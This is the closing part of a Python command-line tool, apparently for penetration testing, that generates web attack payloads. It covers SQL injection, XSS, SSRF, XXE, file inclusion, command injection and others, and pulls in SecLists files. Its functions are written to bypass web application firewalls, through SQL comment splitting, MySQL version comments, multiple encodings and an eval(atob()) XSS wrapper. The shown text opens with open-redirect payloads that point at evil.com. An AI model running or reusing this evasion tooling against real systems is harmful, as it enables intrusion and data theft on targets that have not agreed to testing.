            "http://evil.com:80?@example.com",
            "http://evil.com:80#@example.com",
        ],
    },
}


# ═══════════════════════════════════════════════════════════
# SECLISTS LOADER
# ═══════════════════════════════════════════════════════════

def load_seclists_file(filepath: str) -> list:
    """Load payloads dari file SecLists."""
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.rstrip("\n\r") for line in f if line.strip() and not line.startswith("#")]
        return lines
    except Exception:
        return []


def load_seclists_for_type(vuln_type: str, context: str = None) -> list:
    """Load semua SecLists files untuk vulnerability type tertentu."""
    if vuln_type not in SECLISTS_FILES:
        return []

    files_map = SECLISTS_FILES[vuln_type]
    all_payloads = []

    if context and context in files_map:
        for filepath in files_map[context]:
            all_payloads.extend(load_seclists_file(filepath))
    else:
        for ctx, filepaths in files_map.items():
            for filepath in filepaths:
                all_payloads.extend(load_seclists_file(filepath))

    return list(dict.fromkeys(all_payloads))  # Deduplicate preserving order


# ═══════════════════════════════════════════════════════════
# OBFUSCATION TECHNIQUES (same as before but expanded)
# ═══════════════════════════════════════════════════════════

def case_toggle(payload: str) -> str:
    result = []
    for char in payload:
        if char.isalpha():
            result.append(char.upper() if random.random() > 0.5 else char.lower())
        else:
            result.append(char)
    return "".join(result)

def comment_injection_sql(payload: str) -> str:
    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT",
                "UPDATE", "DELETE", "DROP", "ORDER", "GROUP", "HAVING",
                "SLEEP", "LIMIT", "INTO", "TABLE", "NULL", "LIKE", "BETWEEN"]
    result = payload
    for kw in keywords:
        if kw.upper() in result.upper():
            idx = result.upper().find(kw.upper())
            original = result[idx:idx + len(kw)]
            mid = len(kw) // 2
            replaced = original[:mid] + "/**/" + original[mid:]
            result = result[:idx] + replaced + result[idx + len(kw):]
    return result

def url_encode(payload: str) -> str:
    return quote(payload, safe="")

def double_url_encode(payload: str) -> str:
    return quote(quote(payload, safe=""), safe="")

def hex_encode(payload: str) -> str:
    return "0x" + payload.encode().hex()

def base64_encode(payload: str) -> str:
    return base64.b64encode(payload.encode()).decode()

def html_entity_encode(payload: str) -> str:
    return "".join(f"&#{ord(c)};" for c in payload)

def html_hex_entity_encode(payload: str) -> str:
    return "".join(f"&#x{ord(c):x};" for c in payload)

def unicode_escape(payload: str) -> str:
    return "".join(f"\\u{ord(c):04x}" for c in payload)

def whitespace_substitute(payload: str) -> str:
    alternatives = ["%09", "%0a", "%0d", "/**/", "+", "%0b", "%0c", "%a0"]
    return payload.replace(" ", random.choice(alternatives))

def mysql_version_comment(payload: str) -> str:
    keywords = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR"]
    result = payload
    for kw in keywords:
        if kw.upper() in result.upper():
            idx = result.upper().find(kw.upper())
            original = result[idx:idx + len(kw)]
            replaced = f"/*!50000{original}*/"
            result = result[:idx] + replaced + result[idx + len(kw):]
    return result

def no_parentheses_xss(payload: str) -> str:
    return payload.replace("alert(document.domain)", "alert`document.domain`")

def base64_xss_wrapper(payload: str) -> str:
    if "alert" in payload or "eval" in payload:
        js_code = payload
        if "<script>" in payload:
            js_code = payload.replace("<script>", "").replace("</script>", "")
        b64 = base64.b64encode(js_code.encode()).decode()
        return f"<img src=x onerror=eval(atob('{b64}'))>"
    return payload

def apply_obfuscation(payload: str, vuln_type: str) -> list:
    variants = []
    variants.append(("Case Toggle", case_toggle(payload)))
    variants.append(("URL Encode", url_encode(payload)))
    variants.append(("Double URL Encode", double_url_encode(payload)))
    if " " in payload:
        variants.append(("Whitespace Sub", whitespace_substitute(payload)))
    if vuln_type == "sqli":
        variants.append(("Comment Injection", comment_injection_sql(payload)))
        variants.append(("MySQL Version Comment", mysql_version_comment(payload)))
    if vuln_type == "xss":
        variants.append(("HTML Entity (Dec)", html_entity_encode(payload)))
        variants.append(("HTML Entity (Hex)", html_hex_entity_encode(payload)))
        variants.append(("No Parentheses", no_parentheses_xss(payload)))
        variants.append(("Base64 XSS Wrapper", base64_xss_wrapper(payload)))
        variants.append(("Unicode Escape", unicode_escape(payload)))
    variants.append(("Case + URL Encode", url_encode(case_toggle(payload))))
    if vuln_type == "sqli" and " " in payload:
        variants.append(("Comment + Case", case_toggle(comment_injection_sql(payload))))
    return variants


# ═══════════════════════════════════════════════════════════
# OUTPUT
# ═══════════════════════════════════════════════════════════

def print_payloads(vuln_type: str, context: str, waf_bypass: bool,
                   load_seclists: bool, output_file: str = None):
    all_output = []

    # 1. Load built-in payloads
    builtin = []
    if vuln_type in BUILTIN_PAYLOADS:
        type_payloads = BUILTIN_PAYLOADS[vuln_type]
        if context in type_payloads:
            builtin = type_payloads[context]
        else:
            # Load all contexts
            for ctx_payloads in type_payloads.values():
                builtin.extend(ctx_payloads)

    # 2. Load SecLists payloads
    seclists = []
    if load_seclists:
        seclists = load_seclists_for_type(vuln_type, context if context != "all" else None)

    # 3. Combine and deduplicate
    combined = list(dict.fromkeys(builtin + seclists))

    header = f"""
╔══════════════════════════════════════════════════════════════╗
║  🎯 Payload Generator — {vuln_type.upper()} ({context})
║  WAF Bypass: {'ENABLED' if waf_bypass else 'DISABLED'}
║  SecLists: {'LOADED' if load_seclists else 'BUILTIN ONLY'}
║  Built-in Payloads: {len(builtin)}
║  SecLists Payloads: {len(seclists)}
║  Total Unique: {len(combined)}
╚══════════════════════════════════════════════════════════════╝
"""
    print(header)

    for i, payload in enumerate(combined, 1):
        if not payload.strip():
            continue
        print(f"\n{'─' * 60}")
        print(f"[{i}] {payload}")
        all_output.append(payload)

        if waf_bypass:
            variants = apply_obfuscation(payload, vuln_type)
            for technique, variant in variants:
                if variant != payload:
                    print(f"    ├── [{technique}]: {variant}")
                    all_output.append(variant)

    # SecLists reference
    if vuln_type in SECLISTS_FILES:
        print(f"\n{'═' * 60}")
        print(f"📁 SecLists Files Available:")
        for ctx, filepaths in SECLISTS_FILES[vuln_type].items():
            for path in filepaths:
                exists = "✅" if os.path.exists(path) else "❌"
                lines = 0
                if os.path.exists(path):
                    try:
                        with open(path) as f:
                            lines = sum(1 for _ in f)
                    except:
                        pass
                print(f"   {exists} [{ctx}] {os.path.basename(path)} ({lines} lines)")

    print(f"\n{'═' * 60}")
    print(f"✅ Total payloads generated: {len(all_output)}")

    if output_file:
        with open(output_file, "w") as f:
            for p in all_output:
                f.write(p + "\n")
        print(f"💾 Saved to: {output_file}")

    return all_output


def list_types():
    print("\n📋 Available Vulnerability Types:\n")

    print("  Built-in Payloads:")
    for vuln_type, contexts in BUILTIN_PAYLOADS.items():
        total = sum(len(p) for p in contexts.values())
        print(f"  🔹 {vuln_type} ({total} payloads)")
        for ctx, payloads in contexts.items():
            print(f"     └── {ctx} ({len(payloads)} payloads)")

    print(f"\n  SecLists Files (use --load-seclists to include):")
    for vuln_type, contexts in SECLISTS_FILES.items():
        total_files = sum(len(f) for f in contexts.values())
        total_lines = 0
        for ctx, filepaths in contexts.items():
            for path in filepaths:
                if os.path.exists(path):
                    try:
                        with open(path) as f:
                            total_lines += sum(1 for _ in f)
                    except:
                        pass
        print(f"  📁 {vuln_type} ({total_files} files, ~{total_lines} payloads)")
        for ctx, filepaths in contexts.items():
            ctx_lines = 0
            for path in filepaths:
                if os.path.exists(path):
                    try:
                        with open(path) as f:
                            ctx_lines += sum(1 for _ in f)
                    except:
                        pass
            print(f"     └── {ctx} ({len(filepaths)} files, ~{ctx_lines} payloads)")

    print(f"\n💡 Usage:")
    print(f"  python {sys.argv[0]} --type <type> --context <context> [--waf-bypass] [--load-seclists]")
    print(f"  python {sys.argv[0]} --type sqli --context all --load-seclists --waf-bypass")
    print(f"  python {sys.argv[0]} --type xss --load-seclists --output xss_all.txt")


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="🎯 Payload Generator — Generate & obfuscate payloads untuk WAF bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python payload_generator.py --type xss --context html --waf-bypass
  python payload_generator.py --type sqli --context generic --waf-bypass
  python payload_generator.py --type sqli --context auth_bypass --load-seclists
  python payload_generator.py --type sqli --context nosql
  python payload_generator.py --type sqli --load-seclists --output sqli_all.txt
  python payload_generator.py --type ssrf --context cloud_metadata
  python payload_generator.py --type xxe --context blind_oob
  python payload_generator.py --type lfi --context linux --waf-bypass
  python payload_generator.py --type cmdi --load-seclists
  python payload_generator.py --type ssti --context detection
  python payload_generator.py --type ssi
  python payload_generator.py --type ldap
  python payload_generator.py --type crlf
  python payload_generator.py --type open_redirect
  python payload_generator.py --list-types
        """
    )
    parser.add_argument("--type", "-t", help="Vulnerability type")
    parser.add_argument("--context", "-c", default="all",
                        help="Payload context (default: all)")
    parser.add_argument("--waf-bypass", "-w", action="store_true",
                        help="Enable WAF bypass obfuscation techniques")
    parser.add_argument("--load-seclists", "-s", action="store_true",
                        help="Load payloads from SecLists files (comprehensive)")
    parser.add_argument("--output", "-o", help="Save payloads to file")
    parser.add_argument("--list-types", "-l", action="store_true",
                        help="List all available types and contexts")
    parser.add_argument("--json", action="store_true",
                        help="Output in JSON format")

    args = parser.parse_args()

    if args.list_types:
        list_types()
        return

    if not args.type:
        parser.print_help()
        return

    vuln_type = args.type.lower()
    context = args.context.lower()

    if vuln_type not in BUILTIN_PAYLOADS and vuln_type not in SECLISTS_FILES:
        print(f"[!] Unknown vulnerability type: {vuln_type}")
        print(f"[*] Available: {', '.join(set(list(BUILTIN_PAYLOADS.keys()) + list(SECLISTS_FILES.keys())))}")
        sys.exit(1)

    if args.json:
        builtin = []
        if vuln_type in BUILTIN_PAYLOADS:
            type_payloads = BUILTIN_PAYLOADS[vuln_type]
            if context in type_payloads:
                builtin = type_payloads[context]
            else:
                for ctx_payloads in type_payloads.values():
                    builtin.extend(ctx_payloads)

        seclists = []
        if args.load_seclists:
            seclists = load_seclists_for_type(vuln_type, context if context != "all" else None)

        combined = list(dict.fromkeys(builtin + seclists))
        result = {"type": vuln_type, "context": context, "total": len(combined), "payloads": []}
        for payload in combined:
            entry = {"original": payload, "variants": []}
            if args.waf_bypass:
                for technique, variant in apply_obfuscation(payload, vuln_type):
                    if variant != payload:
                        entry["variants"].append({"technique": technique, "payload": variant})
            result["payloads"].append(entry)
        print(json.dumps(result, indent=2))
    else:
        print_payloads(vuln_type, context, args.waf_bypass, args.load_seclists, args.output)


if __name__ == "__main__":
    main()
